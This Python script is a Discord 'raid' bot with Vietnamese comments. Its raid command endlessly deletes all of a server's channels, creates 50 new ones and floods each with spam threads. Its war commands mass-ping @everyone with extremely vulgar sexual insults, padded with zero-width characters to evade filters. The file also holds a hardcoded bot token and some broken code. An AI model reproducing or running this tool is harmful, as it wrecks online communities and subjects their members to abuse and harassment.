import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import threading
import random
import os
import requests
import time
from colorama import Fore, Style, init

init(autoreset=True)

# ==========================================
# CẤU HÌNH (DÁN TOKEN VÀO ĐÂY)
# ==========================================
TOKEN = 'MTQ1Njg2OTU3Mjk0NTkwMzc3MQ.GFoA1d.SvjYqLXGk8yURqoRGvPC2ORMFOr-63iZDpijMI'
PREFIX = "!"

WAR_QUOTES = [
    "# ALO ĐÂU RỒI EM @everyone",
    "# CÚT RỒI À EM?, GÀ VẬY VÔ SOLO NÈ CON ĐĨ MÁ LỒN THẤM CHƯA CON CẶC LỒN ĐĨ OWNER SV GÀ NÓI CMM ĐI @everyone",
    "# MẤY CON ĐĨ CON MẸ GÀ VẬY MẤY CON LỒN VÔ TIẾP NÈ CON LỒN OWNER GÀ VAIZ LỒN RA JOIN SV BỐ M DẠY NÈ CON @everyone",
    "# CON LỒN ĐĨ MẸ CẦM 3 CÁI NGON TỪ ÓC CHÓ COPY HACKVIET VÔ WAR VỚI ANH MÀY HẢ CON, CÁI TRÌNH RA NGOÀI ĐƯỜNG MẤY ĐƯA NÍT CƯỜI THẤM BÀ CMM GIỜ, ĐÉO CÓ TRÌNH ĐỪNG CÓ WAR? @everyone",
    "# VÔ ĐÂY CHƠI NÈ CON CẶC LỒN 10 MẤY TUỔI MÀ T TƯỞNG MẤY THK 20 MẤY WAR GHÊ LẮM🤣 AI NGỜ MÀY CHỈ BIÊT COPY 3 CÁI DÒNG CỦA HVT THÔI GÀ THỀ VẪN LÀ GÀ TH EM ? @everyone",
    "# @everyone @here MÀY CẦM 3 CÁI NGÔN COPY CỦA MÀY GÕ VỚI ANH HẢ BỊ ANH ĐẠP VÔ CÁI HỌNG DÁI MÀY Ở BÊN BỜ ĐƯỜNG A CẦM SÚNG TỈA BÚNG VÔ CÁI LỖ HỌNG THỐI MẸ MÀY NGOÀI LỀ ĐƯỜNG CN ĐĨ MẸ MÀY ÓC CẶC BỊ ANH BEM DỒN 1 GÓC CẠNH CỦA CÁI BƯỚM MẸ MÀY THÂM NHƯ DÁI LỢN SẮP NGHẺO NHÀ TAO MÀ CON ĐĨ NGU ĂN BOÀI SỐNG QUA NGÀY GIÚP TĂNG THÊM TRÌNH ĐỘ ĂN HẠI CỦA MÀY ĐỪNG BỰC BỘI CHỨ CON NÍT CON NOI VỀ HỌC ĐI ĐỪNG ĐÚ ĐỞN ỚT ĐỎ CHỨNG TỎ EM ĐANG CAY ĐỪNG NỐI NHỮNG LỜI EM ĐANG GẶP PHẢI CHỨ KHÔNG CÓ ĂN HỌC RỒI NÊN NỐI CHUYỆN BỊ NGÁO HAY DO MẸ MÀY BẠI LIỆT NÃO NÊN SINH RA THẰNG CON BỊ KHỜ NGU HỌC PHÁT NGÔN NHỮNG CÂU BỊ XÃ HỘI XA LÁNH RUỒNG BỎ TẨY CHAY CON GÁI MẸ MÀY LẾT NGOÀI ĐƯỜNG BÚ PHÂN BÒ ĐỂ TRÁNH ĐÓI QUA NGÀY"
]

HEADERS = {'Authorization': f'Bot {TOKEN}'}

def get_pure_msg():
    invis = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
    return f"{random.choice(WAR_QUOTES)} {invis}"

# ==========================================
# VJP PRO LOGIC (SỬ DỤNG API TRỰC TIẾP)
# ==========================================

def fast_spam_vjp(channel_id):
    while True:
        r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                          headers=HEADERS, json={'content': get_pure_msg()})
        if r.status_code == 429:
            time.sleep(r.json().get('retry_after', 0.5))
        elif r.status_code != 200: break
        time.sleep(0.1)

def infinite_raid_loop(guild_id):
    """Vòng lặp Hủy diệt: Xóa -> Tạo -> Spam -> Xóa lại"""
    while True:
        # 1. Lấy và xóa toàn bộ kênh
        r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=HEADERS)
        if r.status_code == 200:
            for ch in r.json():
                requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=HEADERS)

        # 2. Tạo kênh mới và spam
        for _ in range(50):
            payload = {'name': 'raid-by-banana', 'type': 0}
            res = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=HEADERS, json=payload)
            if res.status_code == 201:
                cid = res.json()['id']
                # Nã 5 luồng spam vào mỗi kênh
                for _ in range(5): threading.Thread(target=fast_spam_vjp, args=(cid,), daemon=True).start()

        time.sleep(15) # Đợi 15s rồi lặp lại quy trình xóa-tạo để server nát hoàn toàn

# ==========================================
# KHỞI TẠO BOT
# ==========================================
class VjpBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=PREFIX, intents=discord.Intents.all())
        self.war_status = {}

    async def setup_hook(self):
        await self.tree.sync()

bot = VjpBot()

# --- TỰ ĐỘNG XÓA LỆNH NGƯỜI DÙNG ---
@bot.event
async def on_command(ctx):
    try:
        await ctx.message.delete() # Xóa tin nhắn lệnh ngay khi gõ
    except: pass

# --- CÁC LỆNH CHIẾN ---

@bot.command()
async def war(ctx):
    cid = ctx.channel.id
    self.war_status[cid] = True
    while self.war_status.get(cid):
        await ctx.send(get_pure_msg())
        await asyncio.sleep(0.3)

@bot.command()
async def raid(ctx):
    threading.Thread(target=infinite_raid_loop, args=(ctx.guild.id,), daemon=True).start()

# --- SLASH COMMANDS ---

@bot.tree.command(name="war", description="VJP PRO WAR")
async def war_slash(interaction: discord.Interaction):
    await interaction.response.send_message("🔥 WAR ACTIVATED", ephemeral=True)
    cid = interaction.channel_id
    bot.war_status[cid] = True
    while bot.war_active.get(cid):
        await interaction.channel.send(get_pure_msg())
        await asyncio.sleep(0.3)

@bot.tree.command(name="raid", description="VJP PRO RAID (INFINITE LOOP)")
async def raid_slash(interaction: discord.Interaction):
    await interaction.response.send_message("☢️ SERVER DESTROYED", ephemeral=True)
    threading.Thread(target=infinite_raid_loop, args=(interaction.guild.id,), daemon=True).start()

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.MAGENTA}{Style.BRIGHT}BANANA CAT VJP PRO - LOADED")
    print(f"Status: Online as {bot.user}")
    print(f"Commands: {PREFIX}war | {PREFIX}raid")

bot.run(TOKEN)